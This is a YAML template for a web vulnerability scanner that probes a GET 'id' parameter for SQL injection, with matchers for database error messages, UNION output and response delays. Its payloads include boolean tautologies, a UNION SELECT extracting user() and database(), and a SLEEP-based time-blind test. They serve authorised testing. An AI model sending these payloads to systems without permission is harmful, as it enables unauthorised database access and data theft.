id: generic-sqli-get
info:
  name: SQL Injection (GET)
  severity: critical
  description: Generic SQL injection testing for GET parameters - detects all types automatically
  tags:
    - sqli
    - injection
    - generic

generic:
  endpoint: "{{sqli}}"
  method: GET
  parameter: "id"

  # All payloads - engine auto-detects SQLi type from response
  # Special names: baseline (for comparison), bool_true, bool_false (for boolean-blind)
  payloads:
    - name: "baseline"
      value: "test"

    - name: "bool_true"
      value: "' OR '1'='1"

    - name: "bool_false"
      value: "' AND '1'='2"

    - name: "single_quote"
      value: "'"

    - name: "union_select"
      value: "' UNION SELECT NULL,user(),database()-- -"

    - name: "time_blind"
      value: "' AND SLEEP(3)-- -"

  matchers:
    # SQL error messages
    - type: regex
      regex:
        - "SQL syntax.*?near"
        - "mysql_fetch.*?error"
        - "Warning.*?mysql_"
        - "ORA-\\d{5}"
        - "PostgreSQL.*?ERROR"
        - "SQLSTATE\\["

    # Database output (UNION-based)
    - type: regex
      regex:
        - "@@version\\s*[0-9]"
        - "version\\(\\)"
        - "database\\(\\)"

    # Time-based
    - type: time
      threshold_ms: 2500

    # Exclude HTML pages
    - type: word
      words:
        - "<!DOCTYPE html"
        - "<html>"
      negative: true
